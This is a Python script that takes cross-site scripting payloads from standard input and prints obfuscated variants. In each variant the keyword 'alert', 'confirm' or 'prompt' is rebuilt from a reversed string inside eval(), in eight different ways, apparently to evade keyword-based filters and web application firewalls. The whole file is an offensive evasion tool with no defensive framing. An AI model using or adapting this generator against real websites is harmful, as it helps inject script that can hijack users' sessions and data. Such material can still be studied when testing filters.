import sys
import re

def reverse_string_encode(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            rest = payload[start + len(keyword):]
            
            # Reverse and reverse back
            reversed_keyword = keyword[::-1]
            encoded_payloads.append(f"eval('{reversed_keyword}'.split('').reverse().join('')+'{rest}')")
            
            # Reverse with spread operator
            encoded_payloads.append(f"eval([...'{reversed_keyword}'].reverse().join('')+'{rest}')")
            
            # Reverse with Array.from
            encoded_payloads.append(f"eval(Array.from('{reversed_keyword}').reverse().join('')+'{rest}')")
            
            # Reverse with slice
            encoded_payloads.append(f"eval('{reversed_keyword}'.split('').slice().reverse().join('')+'{rest}')")
            
            # Reverse each character individually
            char_array = ','.join(f"'{c}'" for c in reversed(keyword))
            encoded_payloads.append(f"eval([{char_array}].reverse().join('')+'{rest}')")
            
            # Reverse with map
            encoded_payloads.append(f"eval('{reversed_keyword}'.split('').map(x=>x).reverse().join('')+'{rest}')")
            
            # Reverse with reduce
            encoded_payloads.append(f"eval('{reversed_keyword}'.split('').reduce((a,b)=>b+a,'')+'{rest}')")
            
            # Double reverse (reverse of reverse)
            encoded_payloads.append(f"eval('{keyword}'.split('').reverse().reverse().join('')+'{rest}')")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = reverse_string_encode(payload)
        for ep in encoded_payloads:
            print(ep)

